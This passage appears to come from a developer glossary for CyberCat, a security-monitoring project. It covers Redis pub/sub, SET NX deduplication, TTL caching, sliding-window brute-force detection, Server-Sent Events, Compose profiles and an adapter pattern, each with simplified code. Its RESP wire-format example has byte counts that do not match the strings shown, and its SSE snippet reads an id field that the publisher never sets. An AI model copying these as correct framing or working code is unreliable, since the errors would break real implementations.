**Connection-mode switching.** A Redis connection can be in either *normal* mode (issue commands, get replies) or *subscriber* mode (receive pushed messages). Once you call `SUBSCRIBE channel`, that connection enters subscriber mode and **can no longer issue normal commands** — only `(P)SUBSCRIBE`, `(P)UNSUBSCRIBE`, `PING`, `QUIT`. To do other Redis work, you need a *separate* connection.

**The internal data structure.** Redis maintains a `dict` (hash table) mapping channel names → list of subscriber connections. `PUBLISH chan msg`:

1. Look up `chan` in the dict → list of subscribers.
2. For each subscriber connection, write the framed message into the connection's output buffer.
3. Return the number of receivers (you usually don't care).

`SUBSCRIBE chan` adds your connection to the dict's list. `UNSUBSCRIBE` (or disconnect) removes it.

**The wire format** that subscribers receive:

```
*3\r\n
$7\r\nmessage\r\n
$22\r\ncybercat:stream:incidents\r\n
$45\r\n{"type":"incident.updated","data":{"id":"..."}}\r\n
```

That's RESP (Redis Serialization Protocol): an array of three elements — the message type (`message` for direct, `pmessage` for pattern), the channel, the payload. Client libraries parse this for you and fire a callback or yield from an async iterator.

**Why "one subscriber per backend process" is the right pattern.** A naive design would have every SSE-connected browser tab create its own Redis SUBSCRIBE connection. With 100 connected tabs you'd have 100 Redis connections — bloating Redis's connection table. CyberCat's hub-and-spoke instead keeps **one** Redis subscriber connection per uvicorn process, and fans out in-process to per-tab `asyncio.Queue`s:

```python
# backend/app/streaming/bus.py (simplified)
class EventBus:
    def __init__(self, redis_url: str):
        self._redis = redis.asyncio.from_url(redis_url)
        self._pubsub = self._redis.pubsub()
        self._queues: dict[int, asyncio.Queue] = {}
        self._task = asyncio.create_task(self._run())

    async def _run(self):
        await self._pubsub.psubscribe("cybercat:stream:*")
        async for msg in self._pubsub.listen():       # one Redis connection
            if msg["type"] != "pmessage": continue
            envelope = json.loads(msg["data"])
            for q in self._queues.values():            # in-process fanout
                try: q.put_nowait(envelope)
                except asyncio.QueueFull: pass         # drop on slow consumer

    def add_subscriber(self, conn_id: int) -> asyncio.Queue:
        q = asyncio.Queue(maxsize=128)
        self._queues[conn_id] = q
        return q
```

One Redis connection, N in-memory queues, N SSE response generators awaiting `q.get()`.

**The publish side** is trivial:

```python
# backend/app/streaming/publisher.py
async def publish(event_type: str, data: dict) -> None:
    envelope = {"type": event_type, "data": data, "ts": time.time()}
    try:
        await redis.publish(f"cybercat:stream:{topic_for(event_type)}", json.dumps(envelope))
    except Exception:
        log.warning("stream publish failed", exc_info=True)
        # Never raise — domain code shouldn't break because the bus is unhappy
```

The "never raise" rule is critical: streaming is a nice-to-have. If Redis is down, the request that did the actual work (creating an incident, transitioning status) must still succeed. The browser will either reconnect (SSE auto-reconnect) or the safety-net 60s polling will refetch.

**`PSUBSCRIBE` vs `SUBSCRIBE`.** The `P` (pattern) variant uses glob-style wildcards: `PSUBSCRIBE cybercat:stream:*` receives messages from `cybercat:stream:incidents`, `cybercat:stream:detections`, etc. Slightly slower than direct subscribe (Redis has to match each PUBLISH against all patterns) but lets you have one subscriber for many topics.

**Why it exists:** Pub/Sub is the right primitive for "live notifications" — small, frequent, ephemeral signals that subscribers either receive in real-time or don't care about. Cheap, sub-millisecond, no schema enforcement. CyberCat uses it as the fan-out fabric behind SSE: domain code publishes to `cybercat:stream:incidents`, one Redis subscriber per backend process fans out to per-connection `asyncio.Queue`s.

**Where in CyberCat:** `backend/app/streaming/publisher.py` (`publish(event_type, data)` calls `redis.publish(channel, envelope)`). `backend/app/streaming/bus.py` (`EventBus` holds the single Redis subscriber per process, fans out to in-memory queues per SSE connection). The hub-and-spoke pattern keeps Redis connection count low.

**Where else you'll see it:** Postgres `LISTEN`/`NOTIFY` (similar primitive, different transport), MQTT, Kafka topics (with persistence), AWS SNS, Pusher, Ably. The "pub/sub" name predates Redis by decades.

**Tradeoffs:** No persistence = lost messages if a subscriber drops mid-publish. No backpressure — a slow subscriber can drop messages. Not a replacement for a real queue when you need durability (use Redis Streams or a real broker). Perfect for "tell me when something changes so I can refetch."

**Related entries:** [Server-Sent Events (SSE)](#server-sent-events-sse) · [SETNX (set-if-not-exists) for dedup](#setnx-set-if-not-exists-for-dedup)

---

#### SETNX (set-if-not-exists) for dedup
*Introduced: Phase 1 · Category: Database (Redis)*

**Intuition:** `SETNX key value` is "set this key, but only if it doesn't already exist." If two callers try to set the same key, exactly one wins; the loser knows it lost. CyberCat uses this as a cheap "have I seen this before?" check — first request creates the key (succeeds), duplicate requests fail (so they get treated as duplicates).

**Precise:** Redis `SET key value NX EX <ttl>` (the modern form of the legacy `SETNX`) atomically sets `key` to `value` only if `key` does not exist, and applies a time-to-live. The atomic check-and-set is the magic — no race condition possible between checking existence and setting. CyberCat uses dedup keys like `dedup:event:{sha256_of_payload}` with 60s TTL: first ingestion of an event creates the key, duplicates within 60s see it exists and are dropped.

**How it works (under the hood):**

**Why it's atomic.** Redis is **single-threaded** at the command-execution level — every command runs to completion on the main thread before the next one starts. (It uses an event loop on the I/O side, but command dispatch is one-at-a-time.) So *any* Redis command is implicitly atomic; you don't need transactions or locks for "check-and-set" patterns — `SET NX` is one command and either succeeds or doesn't.

**The command syntax.** Modern form (preferred):

```
SET <key> <value> NX EX <seconds>
```

Reply: `"OK"` if set, `(nil)` if the key already existed.

The legacy `SETNX key value` (no TTL) is still supported but always pair with `EXPIRE` to avoid leaking keys forever — the modern combined form is one atomic op, the legacy two-command form has a race window where a crash between SET and EXPIRE leaves a permanent key.

**The dedup pattern in action.** Picture two simultaneous POST /v1/events/raw requests carrying the same event payload:

```python
# backend/app/ingest/pipeline.py (simplified)
async def maybe_skip_dedup(event: Event, redis) -> bool:
    payload_hash = hashlib.sha256(event.canonical_bytes()).hexdigest()
    key = f"dedup:event:{payload_hash}"
    ok = await redis.set(key, "1", nx=True, ex=60)        # ← the magic
    if not ok:
        return True                                         # someone else got here first; skip
    return False                                            # we're the first; proceed
```

Worker A and Worker B both compute the same `payload_hash`, both call `SET key 1 NX EX 60`. Redis sees A's command first, sets the key, replies OK to A. Then B's command — key now exists — replies nil to B. B drops the duplicate. No race possible because the two commands cannot interleave on the Redis server.

**The correlator's incident-dedup keys** use the same pattern over a longer window:

```python
# backend/app/correlation/rules/identity_compromise.py
key = f"dedup:identity_endpoint_chain:{user.id}:{hour_bucket}"
ok = await redis.set(key, incident_id, nx=True, ex=60 * 60 * 6)   # 6-hour TTL
if not ok:
    # Already opened an incident for this user this hour bucket; extend the existing one instead
    existing_id = await redis.get(key)
    return await extend_incident(existing_id, ...)
```

The TTL is the "remembering window" — within 6 hours a repeat signal extends the existing incident; after 6 hours a fresh signal opens a new one. The key value (`incident_id`) is also the pointer back to the existing incident — two purposes from one entry.

**TOCTOU (time-of-check-to-time-of-use) and why this avoids it.** TOCTOU is the bug class where you check a condition (key exists?), then act on it (set the key), and something changes in between. `EXISTS key` followed by `SET key value` has a TOCTOU window of however long the round trip takes — milliseconds, but enough for a high-throughput ingest. `SET ... NX` collapses both into a single atomic op, eliminating the window entirely.

**`hmac.compare_digest` analogue at the Redis level.** Redis is single-threaded; you don't need Lua scripts or `MULTI`/`EXEC` for one-key atomic ops. You DO need them when an atomic op spans multiple keys — e.g., "if A == X, set B = Y" — see the sliding-window entry for an example.

**Why it exists:** The naive "is this duplicate?" check is `EXISTS` then `SET`, which has a race window. `SETNX` collapses it into one atomic op the Redis server serializes. With a TTL, it doubles as "remember this for N seconds, then forget" — perfect for short-window deduplication where keeping a permanent record would be too expensive.

**Where in CyberCat:** Event ingestion dedup (`backend/app/ingest/pipeline.py`), correlator incident dedup (`identity_endpoint_chain:{user}:{hour_bucket}`, `endpoint_compromise_standalone:{host}:{hour_bucket}`), action cooldowns (auto-action dedup over a 120s window). Pattern is universal in the ingest + correlation paths.

**Where else you'll see it:** Distributed lock libraries (`SET NX PX` is the building block of Redlock and similar), cron-job leader election ("set leader-key, NX" — winner runs the job), idempotency-key implementations in payment APIs (Stripe, Square).

**Tradeoffs:** TTL is a tuning knob — too short and duplicates slip through, too long and memory grows. Keys are global to the Redis instance, so naming discipline matters (CyberCat uses `<purpose>:<entity>:<bucket>` everywhere). Not a replacement for DB-level uniqueness when you actually need to *prevent* a duplicate row from being written — only for "can I skip the work?" optimization.

**Related entries:** [TTL and caching](#ttl-time-to-live-and-caching) · [Pub/Sub](#pubsub)

---

#### TTL (time-to-live) and caching
*Introduced: Phase 1 · Category: Database (Redis)*

**Intuition:** TTL is the "self-destruct timer" you can attach to any Redis key. Set a key with a 30-second TTL and Redis will delete it for you in 30 seconds. Combine with `SET` and you have a cache that automatically invalidates without any cleanup code.

**Precise:** Redis stores an optional expiration time per key (`EX <seconds>` or `PX <milliseconds>` on `SET`, or `EXPIRE key seconds` after the fact). The expiration is checked on access and by a background sampler. Reads of expired keys return `nil` (treated by clients as cache miss). For caching, the pattern is: try `GET key` → if `nil`, compute the answer → `SET key value EX 30` → return.

**How it works (under the hood):**

**How TTL is stored.** Each key has an optional `expires_at` field (Unix milliseconds). When set, Redis records the absolute expiry time, *not* a relative duration — so clock changes can affect things subtly, but TTL doesn't drift across restarts.

**The two expiration mechanisms:**

1. **Lazy expiration** — every read checks if the key has expired; if yes, delete it on the spot and return `nil`. This handles the "key is read again before background sampler hits it" case for free.
2. **Active expiration** — a background loop samples 20 random keys-with-TTL every 100ms; if more than 25% are expired, sample again immediately. This catches keys that get written, expire, and are never read again — without it, expired-but-unread keys would accumulate forever.

The two together give bounded memory growth without a "scan everything every second" cost.

**The cache-aside pattern in code:**

```python
# backend/app/detection/rules/blocked_observable.py (simplified)
async def get_active_blocks(redis, db) -> set[str]:
    cache_key = "cache:blocked_observables:active"
    raw = await redis.get(cache_key)
    if raw is not None:
        return set(json.loads(raw))                    # cache HIT — sub-millisecond

    # cache MISS — compute from DB
    rows = (await db.execute(
        select(BlockedObservable.value).where(BlockedObservable.active == True)
    )).scalars().all()
    values = list(rows)

    # populate cache for next 30 seconds
    await redis.set(cache_key, json.dumps(values), ex=30)
    return set(values)
```

What this gets you: ingest hot path queries the table at most once per 30s instead of once per event. At 100 events/s, that's a 3000× reduction in DB load on this query.

**Explicit invalidation on the write path** — TTL alone isn't enough when freshness on change matters:

```python
# backend/app/response/handlers/block_observable.py (simplified)
async def handle_block_observable(action, db, redis):
    db.add(BlockedObservable(value=action.params["value"], active=True))
    await db.commit()
    await redis.delete("cache:blocked_observables:active")    # next read repopulates from DB
```

Without the `delete`, a freshly-blocked IP would not be detected for up to 30 seconds — bad UX, defeats the response-feedback-loop story. With the explicit invalidation, the next ingest sees the new block immediately.

**Useful TTL commands:**

| Command | What it does |
|---|---|
| `TTL key` | Seconds remaining; `-1` = no TTL set; `-2` = key doesn't exist |
| `EXPIRE key 60` | Set TTL to 60s on existing key |
| `EXPIREAT key <unix-ts>` | Set absolute expiry time |
| `PERSIST key` | Remove TTL — key becomes permanent |

**The `MAXMEMORY` policy interaction.** When Redis hits its memory cap (`maxmemory` in `redis.conf`), the eviction policy kicks in. `allkeys-lru` evicts least-recently-used keys regardless of TTL; `volatile-lru` evicts only TTL'd keys; `noeviction` rejects writes. CyberCat's Redis runs `noeviction` because every write is meaningful (dedup keys, cache, queues) — silent eviction would cause subtle bugs. Memory growth is controlled instead by aggressive TTLs.

**Why it exists:** Most caches don't need to be invalidated explicitly — the data either changes infrequently enough that staleness is acceptable, or there's no clean place to call "evict me." TTL turns "eventual consistency window" into a tunable parameter (30s = slightly stale; 5s = nearly real-time but more compute).

**Where in CyberCat:** `blocked_observables` cache in `backend/app/detection/rules/blocked_observable.py` (30s TTL — avoids per-event DB reads on the hot detection path; cache invalidation on `block_observable` action so the next ingest sees the change). Wazuh AR token cache (270s TTL — refresh before the 300s expiry). Dedup keys (TTL serves as the "remembering window").

**Where else you'll see it:** Memcached (the original "cache with TTL" server), CloudFlare's cache-control headers, browser HTTP caches, every CDN. The "set with TTL" pattern is one of the universal building blocks of distributed systems.

**Tradeoffs:** Stale reads are the cost of caching. For things that *must* be fresh on change (auth state, blocked observables right after blocking), you also need explicit invalidation on the write path. Don't TTL things you can't afford to recompute (recompute cost × TTL frequency = your effective load).

**Related entries:** [SETNX for dedup](#setnx-set-if-not-exists-for-dedup) · [Sliding windows for rate detection](#sliding-windows-for-rate-detection)

---

#### Sliding windows for rate detection
*Introduced: Phase 4 · Category: Database (Redis)*

**Intuition:** A sliding window is "how many of X happened in the last N seconds?" — implemented in Redis by recording each occurrence in a sorted set (or list), then counting only the entries from `now - N` to `now`. The window slides forward on every check.

**Precise:** Implementation pattern with Redis sorted sets: `ZADD key <timestamp> <event_id>` on each occurrence; `ZREMRANGEBYSCORE key 0 <now - window_seconds>` to evict old entries; `ZCARD key` to count. CyberCat's auth-failure detector keeps a sorted set per user, evicts entries older than 60s on each new failure, and fires when the count crosses 4. Atomic via `MULTI` / `EXEC` or a Lua script for high-throughput cases.

**How it works (under the hood):**

**Sorted sets (ZSETs)** are Redis's secret weapon for this. A ZSET is a collection of unique members each with a numeric **score**; members are kept in sorted order by score, with O(log N) insert/delete and O(log N + M) range queries (where M = items returned). For sliding windows, the score *is* the timestamp.

**The four operations you need:**

| Command | Purpose |
|---|---|
| `ZADD key <timestamp> <member>` | Record a new occurrence |
| `ZREMRANGEBYSCORE key 0 <cutoff>` | Evict everything older than the cutoff |
| `ZCARD key` | Count remaining members (= count within window) |
| `EXPIRE key <window>` | Auto-cleanup if the key goes idle |

**The auth-failure detector step-by-step:**

```python
# backend/app/detection/rules/auth_failed_burst.py (simplified)
WINDOW_SEC = 60
THRESHOLD = 4

async def on_auth_failed(event, redis) -> bool:
    user = event.entities["user"]
    now = time.time()
    cutoff = now - WINDOW_SEC
    key = f"detect:auth_burst:{user}"

    # Three commands run as one atomic block via pipeline+MULTI
    pipe = redis.pipeline(transaction=True)
    pipe.zremrangebyscore(key, 0, cutoff)              # evict expired
    pipe.zadd(key, {event.id: now})                    # record this failure
    pipe.zcard(key)                                    # count remaining
    pipe.expire(key, WINDOW_SEC * 2)                   # safety-net cleanup
    _, _, count, _ = await pipe.execute()

    return count >= THRESHOLD                          # True = fire detection
```

Why all four ops in one pipeline: between them, no other request can interleave. If two `auth.failed` events for the same user arrive concurrently, the first one's full pipeline runs to completion before the second one starts — no double-counting, no missed evictions. Without the pipeline you'd have a TOCTOU window where two requests both see "count < 4" and both insert, leading to count = 5 with one extra fire.

**Why ZSET and not a simple counter?** A counter (`INCR key`) tracks a total but can't *evict* entries — once incremented, the value stays until the entire key expires. ZSETs let you remove just the entries that fell out of the window. That's the difference between "fixed-window rate limiting" (count resets every N seconds) and **true sliding window** (always counts the most recent N seconds).

**Memory bounds.** A user under active brute-force attack gets one entry per failed login. At 60s window and 100 attempts/s/user (extreme), that's 6000 entries × ~50 bytes = 300 KB per user. At 1000 attacked users, 300 MB. For most workloads it's a few KB per user.

**Pattern variations:**

- **Per-source rate limit:** `key = f"ratelimit:ip:{ip}"`. Same shape, different identifier.
- **Distinct counts** ("5 *different* failed users from this IP"): use ZSET with member = user_id, ZCARD gives unique count.
- **Decaying counter** (older events count less): use ZINCRBY by a decay factor instead of evicting — heavier compute, occasionally useful.

**Why it exists:** Detecting "5 logins in a minute" is the bread-and-butter of behavioral detection (T1110 brute force, T1078 valid accounts, T1110.003 password spraying). A naive solution would scan the events table every time, which doesn't scale; a sliding window over Redis is microsecond-fast and bounded in memory by the window size.

**Where in CyberCat:** `backend/app/detection/rules/auth_failed_burst.py` (≥4 `auth.failed` for same user in 60s). The pattern generalizes — any "N events in T seconds" rule wears the same shape.

**Where else you'll see it:** Rate limiters (every API gateway uses a sliding-window or token-bucket variant), Datadog anomaly detection, Splunk's `streamstats`, Falco's threshold rules. Redis specifically is so common for this that there's a `redis-cell` module dedicated to rate limiting.

**Tradeoffs:** Memory grows with event rate × window size — for a window of 60s and 1000 events/s/user that's fine; for hours-long windows on millions of users, you'd want a bucketed approximation (count per minute, sum the last 60 buckets). Time skew between the producer and Redis can shift the window — use a single source of timestamps (the Redis server's time, or the ingest time on the backend, never the agent's clock).

**Related entries:** [SETNX for dedup](#setnx-set-if-not-exists-for-dedup) · [TTL and caching](#ttl-time-to-live-and-caching)

---

### Streaming & networking

#### Server-Sent Events (SSE)
*Introduced: Phase 13 · Category: Streaming & networking*

**Intuition:** SSE is "the server can push messages to the browser over a single long-lived HTTP connection." The browser opens a `GET /stream` request, the server keeps it open and writes occasional `data: ...` lines, and the browser fires an event for each one. No WebSocket complexity, no reconnection logic, just HTTP.

**Precise:** Server-Sent Events is a W3C standard (part of HTML5). The server responds with `Content-Type: text/event-stream` and writes UTF-8 framed messages: `event: <name>\ndata: <json>\n\n`. The browser's `EventSource` API consumes them, automatically reconnects on disconnect, and supports `Last-Event-ID` for resume. Unlike WebSockets, SSE is one-way (server → client only), HTTP-native (works through every proxy), and trivial to implement on the server side.

**How it works (under the hood):**

**The HTTP exchange.** The browser opens a normal HTTP request:

```
GET /v1/stream HTTP/1.1
Host: cybercat.local:8080
Accept: text/event-stream
Cache-Control: no-cache
```

The server responds with a stream that *never closes* (until the client disconnects):

```
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive
X-Accel-Buffering: no                 ← tells nginx not to buffer the stream

event: incident.updated
data: {"id":"4a2e-...","status":"investigating"}
id: 12345

event: detection.fired
data: {"id":"...","rule_id":"py.auth.anomalous_source_success"}
id: 12346

: keepalive comment

event: incident.created
data: {"id":"...","kind":"identity_compromise"}
id: 12347
```

**The frame format**, line by line:

- `event: <name>\n` (optional) — names this event so client-side handlers can switch on it.
- `data: <utf-8 string>\n` (one or more) — the payload. Multiple `data:` lines get joined with newlines into one final string.
- `id: <event-id>\n` (optional) — the event's ID; the browser remembers the last one and sends it as `Last-Event-ID` on reconnect.
- `retry: <ms>\n` (optional) — overrides the default reconnect delay (~3s).
- `\n` (blank line) — **the dispatch trigger**. Until the browser sees a blank line, it buffers the event. Forget the blank line and your messages never fire.

A line starting with `:` is a comment, used as a keep-alive (proxies kill idle TCP connections; sending `: ping\n\n` every 15-30s defeats this).

**The browser side** is dead simple:

```javascript
// frontend/app/lib/useStream.ts (simplified)
const es = new EventSource("/v1/stream", { withCredentials: true });

es.addEventListener("incident.updated", (msg) => {
  const data = JSON.parse(msg.data);
  refetchIncident(data.id);
});

es.addEventListener("detection.fired", (msg) => {
  refetchDetections();
});

es.onerror = () => {
  // Browser auto-reconnects after `retry` ms; nothing to do here unless you want to log
};
```

When the connection drops (server restart, network blip, laptop wake), `EventSource` automatically reopens with `Last-Event-ID: 12347` in the request headers — so a server that supports replay can resume from where the client left off. CyberCat doesn't do replay (its events are notifications, not durable messages — clients refetch from the API), so it ignores the header.

**The server-side machinery** in CyberCat:

```python
# backend/app/api/routers/streaming.py (simplified)
@router.get("/stream")
async def stream(request: Request, bus: EventBus = Depends(get_bus)):
    conn_id = id(request)
    queue = bus.add_subscriber(conn_id)

    async def event_generator():
        try:
            # Initial keepalive so the browser knows the stream is alive
            yield ": connected\n\n"

            last_keepalive = time.time()
            while True:
                # Check disconnect
                if await request.is_disconnected():
                    break

                # Wait for an event with a timeout so we can send keepalives
                try:
                    msg = await asyncio.wait_for(queue.get(), timeout=15.0)
                    yield f"event: {msg['type']}\ndata: {json.dumps(msg['data'])}\nid: {msg['id']}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            bus.remove_subscriber(conn_id)

    return StreamingResponse(event_generator(), media_type="text/event-stream", headers={
        "Cache-Control": "no-cache",
        "X-Accel-Buffering": "no",
    })
```

What's happening: `StreamingResponse` wraps an async generator. FastAPI/Starlette consumes the generator, writing each yielded chunk to the socket immediately (no buffering). The generator awaits on `queue.get()`; when an event arrives, it yields the formatted frame; when the timeout fires, it yields a keepalive. When the client disconnects, `await request.is_disconnected()` returns True, the generator returns, the `finally` runs, the subscriber unregisters.

**Headers that matter for proxies.**

- `X-Accel-Buffering: no` (nginx) and `Cache-Control: no-cache` tell intermediaries not to buffer the response. Without these, nginx may hold your messages until it has a "full" response — which never comes — and the browser sees nothing.
- Compression must be off for the stream (gzip buffers); FastAPI's compression middleware should exclude `text/event-stream`.

**Why it exists:** WebSockets are bidirectional and powerful but operationally heavy (proxy support, framing, reconnection logic, security model). For "server pushes notifications, client refetches" — which is 80% of real-time UI use cases — SSE is dramatically simpler. CyberCat used to poll every 5–10 seconds; SSE moves that to "only refetch when something actually changed."

**Where in CyberCat:** `backend/app/api/routers/streaming.py` — `GET /v1/stream` returns a `StreamingResponse` wrapping an async generator. `backend/app/streaming/bus.py` — `EventBus` holds one Redis subscriber, fans out to per-connection `asyncio.Queue`s. `backend/app/streaming/publisher.py` — domain code calls `publish(event_type, data)` after `db.commit()`. Frontend: `frontend/app/lib/useStream.ts` hook replaces `usePolling`; keeps 60s safety-net polling alongside SSE.

**Where else you'll see it:** ChatGPT's streaming responses, Claude's streaming API, GitHub's notifications stream, every "live updates" UI built in the last decade that doesn't need bidirectional. AWS Lambda's streaming responses, Vercel AI SDK, OpenAI's `stream=True` mode all use SSE.

**Tradeoffs:** One-way only — if the client needs to send messages, it does so via separate HTTP requests. Long-held connections eat one socket per client (CyberCat has the hub-and-spoke pattern to keep Redis connections to one per backend process). Some corporate proxies aggressively kill long-lived HTTP connections; the safety-net 60s polling defends against this.

**Related entries:** [Pub/Sub](#pubsub) · [Async / await in Python](#async--await-in-python) · [Next.js App Router](#nextjs-app-router)

---

#### Docker Compose profiles
*Introduced: Phase 16 · Category: Streaming & networking*

**Intuition:** A Compose profile is a tag on a service that means "only start this service if its profile is explicitly requested." Useful when one stack file describes both the always-on core and optional add-ons (Wazuh, lab containers, monitoring).

**Precise:** In `docker-compose.yml`, a service can declare `profiles: [agent]`. Services without a `profiles` key are *always* started (the implicit core). Services with profiles are skipped unless the user passes `--profile agent` to `docker compose up`. CyberCat uses this for the agent vs Wazuh choice: core is always `postgres redis backend frontend`; `--profile agent` adds `lab-debian` + `cct-agent`; `--profile wazuh` adds `lab-debian` + `wazuh-manager` + `wazuh-indexer`. Both profiles can run simultaneously.

**Why it exists:** Without profiles, every service in the file always starts — you can't have "this service exists but isn't on by default" except by maintaining multiple stack files (which drift). Profiles let one source-of-truth file describe several deployment shapes.

**Where in CyberCat:** `infra/compose/docker-compose.yml` — `lab-debian`, `cct-agent` are profile `agent`; the Wazuh services are profile `wazuh`. `start.sh` defaults to `--profile agent` (and provisions `CCT_AGENT_TOKEN` on first run). Phase 19's smoke fix (PR #6) replaced a bare `docker compose up` with `bash start.sh` precisely so smoke tests would get the agent profile + token bootstrap.

**Where else you'll see it:** Kubernetes namespaces + labels are a richer version of the same idea. Helm chart values do this for opt-in subcharts. Terraform `count` and `for_each` express conditional resources. The pattern is everywhere "I want one config file that supports multiple shapes."

**Tradeoffs:** Profile names are global to the file; collision is your problem. Services that depend on profile-only services (`depends_on: [lab-debian]`) need to live in the same profile or you hit "service not found" at startup.

**Related entries:** [Pluggable telemetry adapter pattern](#pluggable-telemetry-adapter-pattern)

---

#### NXDOMAIN (DNS not found)
*Introduced: Phase 19 §A1 · Category: Streaming & networking*

**Intuition:** NXDOMAIN is the DNS response code that means "no record exists for that name." When your code tries to connect to `redis` (a Docker service name) and Docker has removed the container, the DNS lookup returns NXDOMAIN. On Linux this resolves in microseconds; on Docker Desktop on Windows (which routes DNS through WSL2's resolver) it takes ~3.6 seconds, blocking your event loop the whole time.

**Precise:** RFC 1035 defines NXDOMAIN (`Name Error`, RCODE 3) as one of the standard DNS response codes. Resolvers typically retry a few times before declaring NXDOMAIN (CyberCat's Phase 19 §A1 issue: each retry took ~1.2s on WSL2, three retries = ~3.6s). In an async event loop, a synchronous DNS lookup blocks every other coroutine for the duration. The Phase 19 fix wrapped Redis calls with explicit `socket_connect_timeout` + `socket_timeout` and a `safe_redis` shim that catches the lookup failure fast.

**Why it exists:** The DNS standard mandates retry behavior to handle transient network errors. The retry budget is fine for normal use but pathological when the name simply doesn't exist (which is the kill-redis chaos test scenario). Platform-level DNS resolvers vary wildly in how aggressively they cache negative responses and how long they retry.

**Where in CyberCat:** Phase 19 §A1 resilience: `backend/app/resilience/safe_redis.py` (the wrapper); `safe_redis` is wired into the streaming publisher and the rate-detection paths. Verification recipe in `docs/phase-19-handoff.md`. The Linux-runner gap on `PROJECT_STATE.md` scorecard item #2 is specifically because WSL2's slow NXDOMAIN reproduces a *platform* issue, not a CyberCat bug — running on real Linux is required for honest verification.

**Where else you'll see it:** Every system that uses service-discovery via DNS (Consul, AWS Service Discovery, Kubernetes service names) hits this when the target disappears. The standard mitigation is short DNS TTLs + circuit-breakers + explicit timeouts on every network call.

**Tradeoffs:** Aggressive timeouts can fail real requests during transient network blips. Conservative timeouts let pathological cases hang the event loop. The right answer is per-call: a Redis call that's on the hot path of every ingest should fail in 100ms; a back-office report that runs once a day can wait 5s.

**Related entries:** [Connection invalidation on restart](#connection-invalidation-on-restart) · [Async / await in Python](#async--await-in-python)

---

### Project-specific patterns

#### Pluggable telemetry adapter pattern
*Introduced: Phase 16 · Category: Project-specific patterns*

**Intuition:** The pluggable telemetry pattern means everything downstream of "raw event arrives" treats events the same way regardless of which source produced them. The agent, Wazuh, the lab seeder, and the smoke tests all hit the same `POST /v1/events/raw` endpoint and convert into the same canonical event shape — downstream code never knows which sent it.

**Precise:** A canonical `Event` model with a `source: EventSource` enum (`direct` / `wazuh` / `seeder`) and a normalized field set. Each source has an adapter that converts its native shape into the canonical one. The normalization, detection, correlation, response, and UI layers key on the canonical fields, never on the source. Adding a new source = writing one adapter file + adding an enum value; downstream code is unchanged. ADR-0011 formalizes this.

**How it works (under the hood):**

**The canonical Event model** is the contract every source must produce:

```python
# backend/app/schemas/events.py (simplified)
from enum import Enum
from pydantic import BaseModel
from datetime import datetime

class EventSource(str, Enum):
    direct = "direct"      # custom agent
    wazuh = "wazuh"        # Wazuh poller
    seeder = "seeder"      # lab seeder, smoke tests

class EventKind(str, Enum):
    auth_failed = "auth.failed"
    auth_succeeded = "auth.succeeded"
    session_started = "session.started"
    session_ended = "session.ended"
    process_created = "process.created"
    process_exited = "process.exited"
    network_connection = "network.connection"

class Event(BaseModel):
    id: UUID
    source: EventSource           # which adapter produced this
    kind: EventKind
    ts: datetime
    entities: dict[str, str]      # {"user": "alice", "src_ip": "10.0.0.5", "host": "lab-debian"}
    raw: dict                     # original event for forensics; opaque to detection
```

**The single funnel.** Every source path eventually calls `ingest_normalized_event(event)`:

```python
# backend/app/ingest/pipeline.py (the funnel)
async def ingest_normalized_event(event: Event, db, redis) -> Incident | None:
    # 1. Dedup
    if await maybe_skip_dedup(event, redis):
        return None

    # 2. Persist
    db.add(event_row_from(event))

    # 3. Entity extract (upsert + junction)
    await extract_entities(event, db)

    # 4. Detection
    detections = await run_detectors(event, db, redis)

    # 5. Correlation
    incident = await run_correlators(event, detections, db, redis)

    # 6. Commit + auto-actions
    await db.commit()
    await publish("event.ingested", {"event_id": str(event.id)})
    if incident:
        await maybe_run_auto_actions(incident, db, redis)

    return incident
```

Notice: this function takes a canonical `Event`. It does *not* care which source produced it. Every line of detection/correlation/response logic operates on canonical fields. The `event.source` field is preserved for forensics ("where did this come from?") but never branched on for product logic.

**The adapter shape.** Each source's adapter is a pure converter:

```python
# backend/app/ingest/wazuh_decoder.py (simplified — Wazuh-specific knowledge stays here)
def decode_wazuh_alert(raw: dict) -> Event | None:
    rule_id = raw.get("rule", {}).get("id")
    decoder = raw.get("decoder", {}).get("name")
    if decoder == "sshd" and rule_id == "5710":
        return Event(
            id=uuid4(),
            source=EventSource.wazuh,
            kind=EventKind.auth_failed,
            ts=parse_wazuh_ts(raw["timestamp"]),
            entities={"user": raw["data"]["dstuser"], "src_ip": raw["data"]["srcip"]},
            raw=raw,
        )
    # ... more rule mappings ...
    return None  # Wazuh emitted something we don't care about
```

```python
# agent/cct_agent/events.py (the custom agent's converter)
def build_auth_failed_event(parsed: dict) -> dict:
    return {
        "kind": "auth.failed",
        "ts": parsed["ts"],
        "entities": {"user": parsed["user"], "src_ip": parsed["src_ip"]},
        "raw": parsed,
    }
    # The agent POSTs this to /v1/events/raw; the backend wraps it in source=EventSource.direct
```

Different inputs (a Wazuh alert dict from JSON-over-HTTP vs a regex-matched line from `/var/log/auth.log`), same canonical output (`Event(kind=auth.failed, ...)`).

**The "no source-specific branches" rule, made concrete.** This would be a violation:

```python
# DO NOT WRITE THIS
async def run_detectors(event, db, redis):
    if event.source == EventSource.wazuh:
        await wazuh_specific_detector(event)
    else:
        await direct_detector(event)
```

This violates the pluggability contract — adding a new source now requires touching the detection engine. The right pattern: detectors operate on `event.kind` and `event.entities`, never on `event.source`. If a Wazuh-only field is needed, *the adapter must enrich it into the canonical entities dict* before handoff.

**The pluggability test.** A way to know if you've kept the discipline: can you delete one adapter file and the system still works for the other source? If yes, the boundary is healthy. If no — if removing `wazuh_decoder.py` breaks something in `correlation/`, you've leaked source-specific knowledge and need to refactor.

**Why it exists:** Without this discipline, source-specific code bleeds into detection ("if it's from Wazuh, do X; if it's from the agent, do Y"), and switching sources means rewriting half the system. The pattern is the canonical "build for change" architectural move — pay a one-time abstraction cost to make future swaps free.

**Where in CyberCat:** `backend/app/schemas/events.py` (canonical `Event` + `EventSource` enum). `backend/app/ingest/pipeline.py` (`ingest_normalized_event` — the single funnel). `backend/app/ingest/wazuh_*.py` (Wazuh adapter). `agent/cct_agent/` (custom-agent adapter). Ingest adapters do *no* product logic; they only hand off canonical events.

**Where else you'll see it:** Logstash input plugins, Fluentd source plugins, Vector sources, Kafka Connect connectors — every log pipeline tool has this pattern. In Wazuh itself, the decoder layer plays the same role for its many supported log formats.

**Tradeoffs:** The canonical schema is the bottleneck — adding a new field that one source has but others don't requires careful thought (default value? new enum kind?). Schema evolution discipline is real engineering work. Pays for itself the second time you swap a source.

